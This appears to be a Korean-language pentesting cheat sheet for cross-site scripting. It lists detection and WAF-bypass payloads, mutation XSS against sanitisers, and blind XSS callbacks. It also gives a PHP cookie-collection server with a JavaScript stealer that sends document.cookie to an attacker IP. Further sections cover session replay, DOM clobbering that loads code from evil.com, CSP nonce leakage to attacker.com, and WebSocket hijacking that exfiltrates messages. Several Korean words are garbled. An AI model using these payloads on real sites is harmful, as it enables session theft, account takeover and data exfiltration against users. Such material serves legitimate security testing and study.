# 10_XSS

사용자가 넘긴 값이 검증/이스케이프 없이 다른 사용자의 브라우저에서 그대로 실행될 때 발생한다. 세션 탈취, 푸싽 공격, 관리자 권한 탈취로 이어진다.

---

## 유형 구분

| 유형 | 특징 |
| --- | --- |
| Reflected | 요청에 담긴 값이 응답에 그대로 반영됨. 링크 클릭 유도 필요 |
| Stored | DB/파일에 저장되어 다른 사용자가 볼 때 실행됨. 지속적, 피해 우대화 사이즈 큼 |
| DOM-based | 서버 응답은 정상, 클라이언트 JS가 location.hash/postMessage 같은 소스를 innerHTML 같은 싱크에 검증 없이 넣을 때 발생. 서버 로그에 안 남음 |
| Blind | 페이로드를 넣은 화면에서는 결과가 안 보이고, 관리자/백오피스 콘솔이 그 값을 나중에 열어볼 때 실행됨 |

---

## 1단계: 탐지

```html
<script>alert(1)</script>
"><script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

리플렉트/스토어드는 alert 팝업이나 페이지 소스에 페이로드가 그대로 보이는지 확인한다. 검증 직후 반응이 없으면 Blind를 의심하고 다음 단계로 간다.

---

## 2단계: 필터/WAF 우회 기법

```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<iframe onload=alert(1)>
<details open ontoggle=alert(1)>
<video><source onerror=alert(1)>

<ScRiPt>alert(1)</sCrIpT>
<IMG SRC=x OnErRoR=alert(1)>

<img src=x onerror=&#97;lert(1)>
<a href="javas&#99;ript:alert(1)">click</a>

location=`javascript:alert\x281\x29`
onerror=alert;throw 1
<svg onload=alert`1`>
```

---

## 3단계: 사니타이저가 흘러도 파싱 차이로 텅는 mXSS (Mutation XSS)

사니타이저(예: DOMPurify)가 입력을 검사해서 안전하다고 판단하고 다시 직렬화해두면, 브라우저가 그 결과를 재파싱하는 과정에서 예상 못한 태그로 바뀌는 틈을 노린다.

```html
<p id="</title><img src=x onerror=alert()>">
```

title, textarea, style, xmp, script, noscript, iframe 태그 안에 삽입될 때 파싱 컨텍스트가 바뀌어 탈출이 되는 경우가 많음. 가장 강력한 사니타이저(DOMPurify)도 이 버그가 주기적으로 나온다.

---

## Blind XSS 페이로드 + 콜백 확인

```html
"><script src=http://<수신서버>:9000/x></script>
"><img src=x onerror="fetch('http://<수신서버>:9000/x')">
```

```bash
nc -lvnp 9000
```

관리자/백오피스 콘솔이 나중에 그 페이지를 열어볼 때 콜백이 오면 취약점 확정. XSSHunter, Burp Collaborator 같은 전용 도구를 쓰면 자동으로 쿠키/DOM 정보까지 수집된다.

---

## 세션 쿠키 탈취 후 활용

```bash
cat > index.php << 'EOF'
<?php
if (isset($_GET['c'])) {
    file_put_contents("cookies.txt", $_SERVER['REMOTE_ADDR'].": ".urldecode($_GET['c'])."\n", FILE_APPEND);
}
?>
EOF
sudo php -S 0.0.0.0:9200
```

```bash
cat > script.js << 'EOF'
new Image().src='http://<칼리IP>:9200/index.php?c='+document.cookie
EOF
```

```bash
curl -b "session=<탈취한값>" http://<대상>/admin
```

`HttpOnly` 플래그가 쿠키에 있으면 `document.cookie`로는 절대 못 읽어온다는 점 주의 — 이런 경우 CSRF나 서버측 요청 위조 같은 다른 경로를 찾아야 한다.

---

## 파일 업로드를 통한 XSS (SVG)

```xml
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)">
</svg>
```

SVG는 XML 기반 이미지 포맷이라, 미리보기/아바타로 업로드를 받는 기능이 있으면 XSS와 XXE 모두 노려볼 수 있다.

---

## 팁

- 입력이 여러 곳에 반영되면(HTML 본문, 속성, JS 문자열, URL) 각각 다른 페이로드가 필요함
- Blind XSS는 즉시 검증이 안 되는 게 정상 — 관리자가 확인할 때까지 시간이 걸릴 수 있으니 리스너를 계속 켜둔을 것
- CSP가 걸려있으면 헤더 값을 먼저 확인해서 허용된 소스/디렉티브를 파악한 뒤 우회 시도

---

## 고난도: DOM Clobbering

`<script>` 없이도, HTML `id`/`name` 속성으로 만든 요소가 JS 전역 변수나 DOM 참조를 "덮어씌우는(clobbering)" 방식. `<script>`가 완전히 차단된 환경에서 유효한 우회 경로.

```html
<a id="config" href="javascript:alert(1)"></a>
<!-- 페이지 JS 코드가 window.config 를 참조하고 있으면, 이 <a> 요소가 그 변수 자리를 대체함 -->

<form id="config"><input name="url" value="//evil.com/payload.js"></form>
<!-- window.config.url 같은 참조를 우회로 조작 -->
```

React/Vue 같은 프레임워크에서도, 서버가 렌더링한 HTML에 공격자 통제 id/name이 들어가면 클라이언트 JS 로직을 오염시킬 수 있다.

## 고난도: postMessage 기반 DOM XSS

```jsx
// 취약한 리스너 (origin 검증 없음)
window.addEventListener("message", (e) => {
  document.body.innerHTML = e.data.html;  // 검증 없이 바로 innerHTML에 삽입
});
```

```html
<!-- 공격자 페이지에서 -->
<iframe src="https://victim.com/vulnerable-page"></iframe>
<script>
frames[0].postMessage({html: "<img src=x onerror=alert(document.domain)>"}, "*");
</script>
```

`event.origin` 검증이 없는 `message` 리스너는 서버 로그에 전혀 안 남고, DOM Invader(Burp) 같은 도구로만 탐지 가능한 경우가 많다.

## 고난도: CSP 우회 — nonce 유출 (CSS 인젝션 경유)

CSP가 `script-src 'nonce-...'`로 걸려있어도, 페이지에 CSS 인젝션 지점이 있으면 속성 선택자로 nonce 값을 한 글자씩 유출할 수 있다.

```css
[nonce^="a"] { background: url(https://attacker.com/leak?c=a); }
[nonce^="b"] { background: url(https://attacker.com/leak?c=b); }
/* ... 알파벳/숫자 조합을 브루트포스하며 어느 요청이 오는지로 nonce 복원 */
```

## 고난도: WebSocket / Cross-Site WebSocket Hijacking

WebSocket 핸드셰이크는 CORS 정책 적용 대상이 아니라서, 인증 쿠키만으로 세션이 유지되는 WebSocket 엔드포인트는 다른 도메인에서도 연결이 가능하다.

```jsx
var ws = new WebSocket("wss://victim.com/chat");
ws.onopen = () => ws.send(JSON.stringify({action: "getMessages"}));
ws.onmessage = (e) => fetch("https://attacker.com/exfil?d=" + btoa(e.data));
```

서버가 `Origin` 헤더를 검증하지 않으면 그대로 통한다.

## 자동화/도구

```
DOM Invader (Burp 내장) — DOM 소스/싱크 자동 추적
XSS Hunter / XSSHunter Express — Blind XSS 콜백 자동 수집
Retire.js — 취약한 구버전 JS 라이브러리 탐지
```